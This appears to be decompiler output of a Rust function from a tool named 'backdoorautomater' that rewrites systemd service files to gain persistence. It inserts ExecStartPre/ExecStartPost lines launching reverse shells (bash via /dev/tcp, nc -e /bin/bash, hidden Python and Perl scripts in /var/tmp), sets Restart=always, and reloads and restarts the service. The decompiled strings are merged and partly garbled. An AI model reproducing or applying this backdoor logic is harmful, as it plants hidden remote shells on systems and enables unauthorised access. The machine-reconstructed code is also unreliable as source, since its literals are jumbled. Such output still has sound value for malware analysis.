long long backdoorautomater::modifyservice::modify_service(unsigned long long a0, unsigned long long a1, unsigned int a2, unsigned long long a3[3], struct_1 *a4, unsigned long long a5[3])
{
    unsigned int v0;  // [bp-0x4a8]
    void* v1;  // [bp-0x380], Other Possible Types: unsigned long long
    void* v2;  // [bp-0x378], Other Possible Types: unsigned long long
    unsigned int v3;  // [bp-0x36c]
    int v4;  // [bp-0x368], Other Possible Types: char *, char
    int v5;  // [bp-0x368]
    unsigned long long v6[3];  // [bp-0x360], Other Possible Types: unsigned long long
    unsigned long v7;  // [bp-0x358], Other Possible Types: unsigned long long
    int v8;  // [sp-0x328], Other Possible Types: char
    int v9;  // [bp-0x328]
    unsigned long v10;  // [sp-0x318], Other Possible Types: unsigned long long
    int v11;  // [bp-0x308]
    char v12;  // [bp-0x2f8]
    int v13;  // [bp-0x2e8], Other Possible Types: void*
    int v14;  // [bp-0x2e8]
    unsigned long long v15;  // [bp-0x2e0]
    void* v16;  // [bp-0x2d8]
    unsigned int v17;  // [bp-0x2c8]
    unsigned int v18;  // [bp-0x2c4]
    struct_0 *v19;  // [bp-0x2c0]
    struct_0 *v20;  // [bp-0x2b8]
    unsigned long long v21;  // [bp-0x2b0]
    int v22;  // [bp-0x2a8], Other Possible Types: char
    unsigned long long v23;  // [bp-0x298], Other Possible Types: unsigned long
    int v24;  // [bp-0x288], Other Possible Types: unsigned long long
    int v25;  // [bp-0x288], Other Possible Types: char
    unsigned long v26;  // [bp-0x288], Other Possible Types: unsigned long long
    int v27;  // [bp-0x288]
    int v29;  // [bp-0x288]
    unsigned long long v30;  // [bp-0x280]
    char *v31;  // [bp-0x278], Other Possible Types: int, void*, unsigned long, unsigned long long
    int v32;  // [bp-0x278]
    int v33;  // [bp-0x270], Other Possible Types: unsigned long long
    int v34;  // [bp-0x270]
    unsigned long long v35;  // [bp-0x270]
    void* v36;  // [bp-0x268]
    unsigned long long v37;  // [bp-0x1b8]
    int v38;  // [bp-0x1b8]
    int v39;  // [bp-0x1b8]
    unsigned long long v40[3];  // [bp-0x1b0]
    int v41;  // [bp-0x1a8]
    int v42;  // [bp-0x198], Other Possible Types: char
    unsigned long long v43;  // [bp-0x190]
    unsigned long long v44;  // [bp-0x188]
    void* v45;  // [bp-0x178]
    int v46;  // [bp-0x178]
    unsigned long long v47;  // [bp-0x170]
    void* v48;  // [bp-0x168]
    void* v49;  // [bp-0x158]
    int v50;  // [bp-0x158]
    unsigned long long v51;  // [bp-0x150]
    void* v52;  // [bp-0x148], Other Possible Types: unsigned long long
    struct_0 *v53;  // [bp-0x140]
    unsigned int v54;  // [bp-0x134]
    struct_0 *v55;  // [bp-0x130]
    int v56;  // [bp-0x128], Other Possible Types: char
    unsigned long long v57;  // [bp-0x118]
    char v58;  // [bp-0x108]
    unsigned long v59;  // [bp-0xf8]
    char v60;  // [bp-0xe8]
    unsigned long v61;  // [bp-0xd8]
    char v62;  // [bp-0xc8]
    char v63;  // [bp-0xb0]
    int v64;  // [bp-0xa8]
    unsigned long long v65;  // [bp-0x98]
    unsigned long long v66;  // [bp-0x90]
    char v67;  // [bp-0x88]
    unsigned long long v68;  // [bp-0x78]
    char v69;  // [bp-0x68]
    unsigned long long v70;  // [bp-0x58]
    char v71;  // [bp-0x48]
    unsigned long long v72;  // [bp-0x38]
    unsigned long v74;  // r14
    unsigned long long v75;  // rbp
    unsigned long long v76[3];  // rdx
    unsigned long long v77[3];  // rax
    unsigned int v78;  // r12d
    unsigned long long v79;  // rbx
    unsigned int v81;  // eax
    unsigned long long v83;  // rax
    unsigned int v84;  // r12d
    unsigned long long v85;  // rax
    unsigned long long v86;  // rax
    unsigned long long v87;  // rbx
    unsigned long long v88;  // rax
    unsigned long v89;  // rbx
    unsigned long long v90[3];  // rax
    unsigned long long v91;  // rbp
    unsigned long long v92;  // rbx
    unsigned long long v93;  // rcx
    int v98;  // xmm1
    void* v100;  // rsi
    unsigned long long v105;  // [bp-0x318]

    v74 = a2;
    v13 = 0;
    v15 = 1;
    v16 = 0;
    v1 = v62.clone(a5) & 0xffffffffffffff00 | 1;
    (char)v25.to_vec("ExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ", 26);
    v57 = v31;
    memcpy(&v56, &v25, 16);
    v75 = vvar_191{reg 56} & 0xffffffffffffff00 | 1;
    v1 = v57 & 0xffffffffffffff00 | 1;
    v2 = v1 & 0xffffffffffffff00 | 1;
    v37 = a3.into_iter();
    v40[0] = v76;
    v77 = v37.next();
    v78 = v74;
    if (v77)
    {
        v79 = 1;
        do
        {
            if (v77[1].is_contained_in(v77[2]))
            {
                switch (v78)
                {
                case 1:
                    v26 = "ExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs";
                    v30 = 17;
                    *((int128_t *)&v31) = *((int128_t *)&(&a4->padding_0)[1]);
                    v1 = &g_565701;
                    v2 = &g_565701;
                    v75 = v75 & 0xffffffffffffff00 | 1;
                    alloc::str::join_generic_copy(&v4, &v26, 2, 1, 0);
                    v105 = v7;
                    memcpy(&v8, &v4, 16);
                    v8.extend_from_slice("  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ", 1);
                    v8.extend_from_slice(a5[1], a5[2]);
                    v8.extend_from_slice(" -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ", 13);
                    v26.clone(&v8);
                    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v13);
                    v16 = v31;
                    *((int128_t *)&v13) = *((int128_t *)&v26);
                    v1 = v16 & 0xffffffffffffff00 | 1;
                    v2 = v1 & 0xffffffffffffff00 | 1;
                    v2 = ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8) & 0xffffffffffffff00 | 1;
                    v3 = 0;
                    goto LABEL_453e9a;
                case 2:
                    *((char **)&v27) = "ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs";
                    v30 = 47;
                    *((int128_t *)&v31) = *((int128_t *)&(&a4->padding_0)[1]);
                    v1 = &g_565701;
                    v2 = &g_565701;
                    v75 = v75 & 0xffffffffffffff00 | 1;
                    alloc::str::join_generic_copy(&(char)v4, &(unsigned long long)v27, 2, 1, 0);
                    v105 = v7;
                    memcpy(&v8, &v4, 16);
                    v8.extend_from_slice("/ 0>&1'&\n.service[^0-9/]+Error!: ", 1);
                    v8.extend_from_slice(a5[1], a5[2]);
                    v8.extend_from_slice(" 0>&1'&\n.service[^0-9/]+Error!: ", 8);
                    v31 = v105;
                    v27 = v9;
                    a3.insert(v79, &(unsigned long long)v27);
                    (unsigned long long)v27.to_vec("Restart=always\n\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 15);
                    v68 = v31;
                    memcpy(&v67, &v25, 16);
                    v2 = a3.insert(v79, &v67) & 0xffffffffffffff00 | 1;
                    v3 = 0;
                    goto LABEL_45469b;
                case 3:
                    v7 = v20->field_10;
                    *((uint128_t *)&v4) = v20->field_0;
                    v31 = v19->field_10;
                    *((uint128_t *)&v25) = v19->field_0;
                    v2 = 0;
                    v1 = 1;
                    v75 = v75 & 0xffffffffffffff00 | 1;
                    v2 = 0;
                    v1 = 1;
                    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_shell_pyfile(&(char)v4, &(char)v25));
                    v26 = "ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs";
                    v30 = 14;
                    v31 = "python /var/tmp/.shell.pyperl /var/tmp/.shell.plsystemctl daemon-reloadExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ";
                    v35 = 25;
                    v2 = 0;
                    v1 = 1;
                    alloc::str::join_generic_copy(&(char)v4, &v26, 2, 1, 0);
                    v105 = v7;
                    memcpy(&v8, &v4, 16);
                    v8.extend_from_slice("\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 1);
                    v26.clone(&v8);
                    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v13);
                    v16 = "python /var/tmp/.shell.pyperl /var/tmp/.shell.plsystemctl daemon-reloadExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ";
                    *((int128_t *)&v14) = *((int128_t *)&v26);
                    v2 = 0;
                    v1 = 1;
                    v81 = ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8);
                case 4:
                    v7 = v20->field_10;
                    *((uint128_t *)&v4) = v20->field_0;
                    v31 = v19->field_10;
                    *((uint128_t *)&v25) = v19->field_0;
                    v2 = 0;
                    v1 = 1;
                    v75 = v75 & 0xffffffffffffff00 | 1;
                    v2 = 0;
                    v1 = 1;
                    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_shell_perl(&(char)v4, &(char)v25));
                    v26 = "ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs";
                    v30 = 14;
                    v31 = "perl /var/tmp/.shell.plsystemctl daemon-reloadExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ";
                    v35 = 23;
                    v2 = 0;
                    v1 = 1;
                    alloc::str::join_generic_copy(&(char)v4, &v26, 2, 1, 0);
                    v105 = v7;
                    memcpy(&v8, &v4, 16);
                    v8.extend_from_slice("\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 1);
                    v26.clone(&v8);
                    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v13);
                    v16 = "perl /var/tmp/.shell.plsystemctl daemon-reloadExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ";
                    *((int128_t *)&v14) = *((int128_t *)&v26);
                    v2 = 0;
                    v1 = 1;
                    v81 = ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v8);
                }
            }
            v77 = v37.next();
            v79 += 1;
        } while (v77);
    }
    v83 = v77 & 0xffffffffffffff00 | 1;
    v2 = v83;
    v3 = 0;
    if ((v74 & 255) <= 4)
    {
        v0 = 26;
        v84 = 0;
        v1 = 1;
        if (((char)(*((char *)&v0 + ((v78 & 31) >> 3)) >> ((char)v78 & 31 & 7)) & 1))
        {
LABEL_453e9a:
            v26 = a3[1];
            v30 = a3[1] + a3[2] * 24;
            v31 = 0;
            do
            {
                v85 = v26.next();
            } while (v76 && !(char)core::str::<impl str>::trim_matches(v76[1], v76[2]).equal(v76, "[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ", 9));
            *((unsigned long long *)&v29) = a3[1];
            v30 = a3[1] + a3[2] * 24;
            v31 = 0;
            do
            {
                v86 = (unsigned long long)v29.next();
                if (!v76)
                {
                    v1 = v86 & 0xffffffffffffff00 | 1;
                    v84 = 0;
                    goto LABEL_4546a5;
                }
                v87 = v86;
                v88 = core::str::<impl str>::trim_matches(v76[1], v76[2]).equal(v76, "[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 9);
            } while (!(char)v88);
            if (!v76)
            {
                v84 = 0;
                v1 = v88 & 0xffffffffffffff00 | 1;
            }
            else if (v87 > v85)
            {
                v89 = v87 - 1;
                v31 = v16;
                *((int128_t *)&v29) = *((int128_t *)&v13);
                v1 = 0;
                v21.insert(v89, &(unsigned long long)v29);
                v1 = 0;
                (unsigned long long)v29.to_vec("Restart=always\n\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 15);
                v70 = v31;
                memcpy(&v69, &v25, 16);
                v75 = (v75 & 0xffffffffffffff00 | 1) & 0xffffffffffffff00 | 1;
                v1 = 0;
                v21.insert(v89, &v69);
                v84 = (unsigned int)&(unsigned long long)v29 & 0xffffff00 | 1;
            }
            else
            {
                v31 = v16;
                *((int128_t *)&v24) = *((int128_t *)&v13);
                v1 = 0;
                v21.push(&(unsigned long long)v29);
                v1 = 0;
                (unsigned long long)v29.to_vec("Restart=always\n\n[Install]okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 15);
                v72 = v31;
                memcpy(&v71, &v25, 16);
                v75 = (v75 & 0xffffffffffffff00 | 1) & 0xffffffffffffff00 | 1;
                v1 = 0;
                v21.push(&v71);
                v84 = (unsigned int)&(unsigned long long)v29 & 0xffffff00 | 1;
            }
        }
    }
    else
    {
LABEL_45469b:
        v84 = 0;
        v1 = v83 & 0xffffffffffffff00 | 1;
    }
LABEL_4546a5:
    *((long long *)&v5) = a3.into_iter();
    v6[0] = v76;
    v91 = (v75 & 0xffffffffffffff00 | 1) & 0xffffffffffffff00 | 1;
    if ((unsigned long long)v5.next())
    {
        v92 = 1;
        do
        {
            if (v90[1].is_contained_in(v90[2]))
            {
                v31 = v57;
                v25 = v56;
                a3.insert(v92, &(char)v25);
                v17 = 0;
                v91 = 0;
                goto LABEL_45475f;
            }
            v90 = (unsigned long long)v5.next();
            v92 += 1;
        } while (v90);
        v17 = 1;
        v91 = v91 & 0xffffffffffffff00 | 1;
    }
    else
    {
        v17 = 1;
    }
LABEL_45475f:
    v63.clone(a0);
    v7 = v53->field_10;
    *((uint128_t *)&v5) = v53->field_0;
    v93 = a1;
    v31 = v55->field_10;
    *((uint128_t *)&v25) = v55->field_0;
    v18 = v91;
    backdoorautomater::sanitizer::sanitize_return_fn(backdoorautomater::modifyservice::write_service(&(unsigned long long)v5, &(char)v25, a3));
    v65 = "systemctl daemon-reloadExecStartPre=/bin/sleep 15[Service]  -e /bin/bash/ 0>&1'&\n.service[^0-9/]+Error!: ";
    v66 = 23;
    (char)v25.new("sh-cFailed to execute commandsrc/modifyservice.rs", 2);
    (unsigned long long)v5.output((char)v25.arg("-cFailed to execute commandsrc/modifyservice.rs", 2).arg(&v65));
    v37.expect(&(unsigned long long)v5, &g_629e70);
    ::0x451fc0::core::ptr::drop_in_place<std::process::Command>(&(char)v25);
    (unsigned long long)v5.from_utf8_lossy(*((long long *)&v42), v43);
    (char)v25.to_vec((unsigned long long)v5.deref(), a2);
    v23 = v31;
    memcpy(&v22, &v25, 16);
    ::0x452060::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&(unsigned long long)v5);
    backdoorautomater::sanitizer::sanitize_system_command(&v22);
    v24 = "systemctl stop ";
    v30 = 15;
    v32 = v64;
    alloc::str::join_generic_copy(&(unsigned long long)v5, &v24, 2, 1, 0);
    v59 = v7;
    memcpy(&v58, &v4, 16);
    v24.new("sh-cFailed to execute commandsrc/modifyservice.rs", 2);
    (unsigned long long)v5.output(v24.arg("-cFailed to execute commandsrc/modifyservice.rs", 2).arg(&v58));
    v9.expect(&(unsigned long long)v5, &g_629e88);
    ::0x451f60::core::ptr::drop_in_place<std::process::Output>(&v37);
    v44 = *((long long *)&v12);
    v98 = *((int128_t *)&v105);
    v42 = v11;
    v41 = v98;
    v38 = v9;
    ::0x451fc0::core::ptr::drop_in_place<std::process::Command>(&v24);
    (unsigned long long)v5.from_utf8_lossy((long long)v42, v43);
    v24.to_vec((unsigned long long)v5.deref(), a2);
    v10 = v31;
    memcpy(&v8, &v25, 16);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v22);
    v23 = v10;
    v22 = v8;
    ::0x452060::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&(unsigned long long)v5);
    backdoorautomater::sanitizer::sanitize_system_command(&v22);
    v24 = "systemctl start s.connect((v_ip,";
    v30 = 16;
    v31 = v64;
    alloc::str::join_generic_copy(&(unsigned long long)v5, &v24, 2, 1, 0);
    v54 = v84;
    v61 = v7;
    memcpy(&v60, &v4, 16);
    v45 = 0;
    v47 = 1;
    v48 = 0;
    v49 = 0;
    v51 = 1;
    v52 = 0;
    for (v100 = 0; !(char)1.index(v100).equal(v76, "okExecStartPost=nc ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/ExecStartPost=sh-cFailed to execute commandsrc/modifyservice.rs", 2); v100 = v52)
    {
        v24 = &g_629f08;
        v30 = 1;
        v31 = 8;
        *((uint128_t *)&v33) = 0;
        std::io::stdio::_print(&v24);
        v4 = &v62;
        v6 = <alloc::string::String as core::fmt::Display>::fmt;
        v24 = &g_629f18;
        v30 = 2;
        v36 = 0;
        v31 = &v4;
        v35 = 1;
        std::io::stdio::_print(&v24);
        v24 = &g_629f38;
        v30 = 1;
        v31 = 8;
        *((uint128_t *)&v33) = 0;
        std::io::stdio::_print(&v24);
        v24 = std::io::stdio::stdin();
        v24.read_line(&v45).expect(v76);
        v24.to_vec(core::str::<impl str>::trim_end_matches(1, v48, 10), a2);
        v7 = v31;
        *((int128_t *)&v5) = *((int128_t *)&v24);
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v45);
        v48 = v7;
        *((int128_t *)&v46) = (int128_t)v5;
        v24.clone(&v45);
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v49);
        v52 = v31;
        *((int128_t *)&v50) = *((int128_t *)&v24);
        v45.clear();
    }
    v24 = &g_629ea0;
    v30 = 1;
    v31 = 8;
    *((uint128_t *)&v34) = 0;
    std::io::stdio::_print(&v24);
    v24.new("sh-cFailed to execute commandsrc/modifyservice.rs", 2);
    v4.output(v24.arg("-cFailed to execute commandsrc/modifyservice.rs", 2).arg(&v60));
    v9.expect(&v4, &g_629eb0);
    ::0x451f60::core::ptr::drop_in_place<std::process::Output>(&v37);
    v44 = *((long long *)&v12);
    memcpy(&(char)v42, &v11, 16);
    memcpy(&v41, &v10, 16);
    v39 = v8;
    ::0x451fc0::core::ptr::drop_in_place<std::process::Command>(&v24);
    v4.from_utf8_lossy((long long)v42, v43);
    v24.to_vec(v4.deref(), a2);
    v10 = 8;
    memcpy(&v8, &v25, 16);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v22);
    v23 = 8;
    v22 = v8;
    ::0x452060::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v4);
    backdoorautomater::sanitizer::sanitize_ex_stderr(&v22);
    v24 = &g_629ec8;
    v30 = 1;
    v31 = 8;
    *((uint128_t *)&v33) = 0;
    std::io::stdio::_print(&v24);
    v4 = &v62;
    v6 = <alloc::string::String as core::fmt::Display>::fmt;
    v24 = &g_629ed8;
    v30 = 2;
    v36 = 0;
    v31 = &v4;
    v33 = 1;
    std::io::stdio::_print(&v24);
    v24 = &g_629ef8;
    v30 = 1;
    v31 = 8;
    *((uint128_t *)&v33) = 0;
    std::io::stdio::_print(&v24);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v49);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v45);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v60);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v58);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v22);
    ::0x451f60::core::ptr::drop_in_place<std::process::Output>(&v37);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v63);
    if ((char)v17)
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v56);
    if (!(char)v54)
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v13);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&v62);
    if (!(char)v3)
    {
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a5);
        ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a4);
    }
    return ::0x452170::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v21);
}
